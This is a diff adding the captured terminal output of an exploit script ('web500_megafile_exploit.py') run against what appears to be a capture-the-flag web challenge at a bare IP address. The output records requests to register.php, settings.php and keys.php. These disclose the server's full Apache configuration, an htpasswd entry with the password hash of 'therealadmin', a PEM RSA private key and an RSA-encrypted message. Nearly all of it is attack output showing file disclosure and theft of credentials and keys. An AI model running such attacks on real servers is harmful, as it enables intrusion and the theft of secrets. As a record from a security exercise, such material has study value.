@@ -1,0 +1,204 @@
+$ ./web500_megafile_exploit.py
+"http://107.170.127.56/register.php": 302
+"http://107.170.127.56/": 200
+"http://107.170.127.56/": 200
+This secret message is for the president. This encoding and RSA encryption should help keep it safe.
+
+w8KqOpNKNlc+5nUDi1VF5nj9Yo+9J87zvjYbu8DabzDCeWXtt6NKMbWOqTkf/fmy/AVmS5xN9zic
+/YrO4rpwia+KEQJJJNG5mFQ7emcddEaEJwMKLTbv1ol//WsUht/JCDMSP1StFLguTY715RgbkThi
+BHPNbdgPmY3R23dfjz4=
+
+"http://107.170.127.56/settings.php": 200
+#ServerRoot "/etc/apache2"
+
+#
+# The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
+#
+Mutex file:${APACHE_LOCK_DIR} default
+
+#
+# PidFile: The file in which the server should record its process
+# identification number when it starts.
+# This needs to be set in /etc/apache2/envvars
+#
+PidFile ${APACHE_PID_FILE}
+
+#
+# Timeout: The number of seconds before receives and sends time out.
+#
+Timeout 300
+
+#
+# KeepAlive: Whether or not to allow persistent connections (more than
+# one request per connection). Set to "Off" to deactivate.
+#
+KeepAlive On
+
+#
+# MaxKeepAliveRequests: The maximum number of requests to allow
+# during a persistent connection. Set to 0 to allow an unlimited amount.
+# We recommend you leave this number high, for maximum performance.
+#
+MaxKeepAliveRequests 100
+
+#
+# KeepAliveTimeout: Number of seconds to wait for the next request from the
+# same client on the same connection.
+#
+KeepAliveTimeout 5
+
+
+# These need to be set in /etc/apache2/envvars
+User ${APACHE_RUN_USER}
+Group ${APACHE_RUN_GROUP}
+
+#
+HostnameLookups Off
+
+#
+ErrorLog ${APACHE_LOG_DIR}/error.log
+
+#
+#
+LogLevel warn
+
+# Include module configuration:
+IncludeOptional mods-enabled/*.load
+IncludeOptional mods-enabled/*.conf
+
+# Include list of ports to listen on
+Include ports.conf
+
+
+#<!--
+<Directory />
+        Options FollowSymLinks
+        AllowOverride None
+        Require all denied
+</Directory>
+
+<Directory /usr/share>
+        AllowOverride None
+        Require all granted
+</Directory>
+
+<Directory /var/www/>
+        Options -Indexes -FollowSymLinks
+        AllowOverride None
+        Require all granted
+</Directory>
+
+<Directory /var/www/html/xml>
+        Options +Indexes
+        AllowOverride None
+        Require all granted
+</Directory>
+#-->
+
+#<!--
+<Directory "/var/www/html/backups">
+#-->&lt;Directory "/var/www/html/backups"&gt;
+        Options +Indexes
+        AuthType Basic
+        AuthName "You shouldn't be here.."
+        AuthUserFile "/etc/apache2/htpasswd"
+        Require valid-user
+
+        Order allow,deny
+        Allow from all
+#<!--
+</Directory>
+#-->&lt;Directory&gt;
+
+#<!--
+#<Directory /srv/>
+#       Options Indexes FollowSymLinks
+#       AllowOverride None
+#       Require all granted
+#</Directory>
+#-->
+
+
+
+# AccessFileName: The name of the file to look for in each directory
+# for additional configuration directives.  See also the AllowOverride
+# directive.
+#
+AccessFileName .htaccess
+
+#
+# The following lines prevent .htaccess and .htpasswd files from being
+# viewed by Web clients.
+#<!--
+<FilesMatch "^\.ht">
+        Require all denied
+</FilesMatch>
+#-->
+
+#
+# The following directives define some format nicknames for use with
+# a CustomLog directive.
+#
+# These deviate from the Common Log Format definitions in that they use %O
+# (the actual bytes sent including headers) instead of %b (the size of the
+# requested file), because the latter makes it impossible to detect partial
+# requests.
+#
+# Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
+# Use mod_remoteip instead.
+#
+LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
+LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
+LogFormat "%h %l %u %t \"%r\" %>s %O" common
+LogFormat "%{Referer}i -> %U" referer
+LogFormat "%{User-agent}i" agent
+
+# Include of directories ignores editors' and dpkg's backup files,
+# see README.Debian for details.
+
+# Include generic snippets of statements
+IncludeOptional conf-enabled/*.conf
+
+# Include the virtual host configurations:
+IncludeOptional sites-enabled/*.conf
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+
+"http://107.170.127.56/settings.php": 200
+therealadmin:$apr1$TFzOAogC$MrwZBEuak2Q1KCVNmE8sR1
+
+"http://107.170.127.56/keys.php": 200
+<br />
+<b>Warning</b>:  strlen() expects parameter 1 to be string, array given in <b>/var/www/html/functions.php</b> on line <b>263</b><br />
+<br />
+<b>Notice</b>:  Undefined offset: -1 in <b>/var/www/html/functions.php</b> on line <b>264</b><br />
+Be careful formatting. Inspect element might be useful.<br>
+key:<br><br>
+-----BEGIN PRIVATE KEY-----
+MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAMfYhGUeciZJ8bgk
+2WKuySGvk1E0SXMgxO/AoghYa96QQWV22ocaicc5HnIMPeRB1HJu9Ywq3R8YOm/k
+YQ47n2kTGqz2hwp/t97fItWfJIH5+jDTEkaus/IZBWrJs0h3MTYAI+FvBt/vIj42
+KLh+lLVKY4kpcAoPvUNv0Scct/6nAgMBAAECgYBm/TANpIkTLlxBl8vnzUed8ouq
+95U6nZKgM9fNETRV+GWbUor/wS9r2gXUpHZo4XwIlSI54AUgdy32Z+2Ulilp5c/W
+QI0QeW76wyPXCRdPecYr2sC5phVl0q/NAVNE3uUIKnDCwSYXLNDhQyXlkkJj8b9u
+JFgp51+yOxxmjaY3sQJBAOkcp3wVenu/E6d9zYuUu38fO13zOBbfazSn/1FrL2GW
+9a2eqPHpSrYM2IbkyuQ1isUIDH1G2JK4jdpowp8JOLsCQQDbd7T6WanMVx2EkzPZ
+qh5ObNuHEN1VXNPXa+ZIyNjOdZZbZZqWTeykN0sf8/SyTxxM2N9wXoH5YCPJqHmE
+VPkFAkBGn47CUgOEoBQFR2DRa+MOFVk4Emqoy1FAZ7E7any1VTXjPtEyURp4YxXq
+cEBjuTDslo6qGZ+de9pGFDz6T6HnAkEAuX6UGIVwXqXC7Sr9yBthQif/5Ej8ygmL
+g6hPG3WmydnZG6bk4eU6/hE+DePEDnGPGeSz9eXrNTttBCTBkHfBgQJBAIUbndei
+Se1JC0vqTy2516c8Pc5jDDeq5S3nppUo6po+a64hYYfuenrfDAvkbVTBLZRTrcy+
+UefpSlrssfYdJas=
+-----END PRIVATE KEY-----
+
+
+<br><br>
+Python 2.7.9 (default, Mar  1 2015, 12:57:24)
+Type "copyright", "credits" or "license" for more information.
+
+IPython 4.0.0 -- An enhanced Interactive Python.
+?         -> Introduction and overview of IPython's features.
+%quickref -> Quick reference.
+help      -> Python's own help system.
+object?   -> Details about 'object', use 'object??' for extra details.
+
+In [1]:
